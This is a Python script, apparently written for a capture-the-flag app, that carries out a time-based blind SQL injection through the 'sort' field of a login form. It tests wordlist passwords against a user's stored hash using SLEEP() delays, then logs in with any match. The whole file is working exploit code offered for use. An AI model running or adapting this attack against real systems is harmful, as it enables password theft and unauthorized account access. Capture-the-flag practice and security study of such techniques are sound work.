import argparse
import time
import urllib.parse
import urllib.request


def build_payload(username: str, password: str, delay: int) -> str:
    return (
        "created_at, IF((SELECT password_hash FROM users "
        f"WHERE username='{username}') = SHA2('{password}', 256), "
        f"SLEEP({delay}), 1)"
    )


def measure_delay(
    url: str, username: str, password: str, delay: int, timeout: int
) -> float:
    payload = build_payload(username, password, delay)
    data = urllib.parse.urlencode(
        {
            "username": "invalid",
            "password": "invalid",
            "sort": payload,
        }
    ).encode("utf-8")

    start = time.monotonic()
    with urllib.request.urlopen(url, data=data, timeout=timeout):
        pass
    return time.monotonic() - start


def attempt_login(url: str, username: str, password: str) -> bool:
    data = urllib.parse.urlencode(
        {
            "username": username,
            "password": password,
            "sort": "created_at",
        }
    ).encode("utf-8")

    with urllib.request.urlopen(url, data=data, timeout=10) as response:
        body = response.read().decode("utf-8", errors="ignore")
    return "Login successful" in body


def main() -> None:
    parser = argparse.ArgumentParser(
        description="Time-based SQLi wordlist probe for the CTF app"
    )
    parser.add_argument("--base-url", default="http://127.0.0.1:5000")
    parser.add_argument("--username", default="clinician")
    parser.add_argument("--wordlist", default="wordlist.txt")
    parser.add_argument("--delay", type=int, default=3)
    parser.add_argument("--threshold", type=float, default=2.5)
    parser.add_argument(
        "--timeout",
        type=int,
        default=15,
        help="HTTP timeout in seconds (should be > delay).",
    )
    args = parser.parse_args()

    login_url = f"{args.base_url.rstrip('/')}/login"

    with open(args.wordlist, "r", encoding="utf-8") as handle:
        for line in handle:
            candidate = line.strip()
            if not candidate:
                continue
            try:
                elapsed = measure_delay(
                    login_url, args.username, candidate, args.delay, args.timeout
                )
            except TimeoutError:
                print(
                    "Request timed out. Increase --timeout or check server reachability."
                )
                return
            print(f"Tried {candidate!r}: {elapsed:.2f}s")
            if elapsed >= args.threshold:
                print(f"Potential password found: {candidate}")
                if attempt_login(login_url, args.username, candidate):
                    print("Login succeeded with extracted password.")
                else:
                    print("Login did not succeed. Check threshold/delay.")
                return

    print("No password found in wordlist.")


if __name__ == "__main__":
    main()
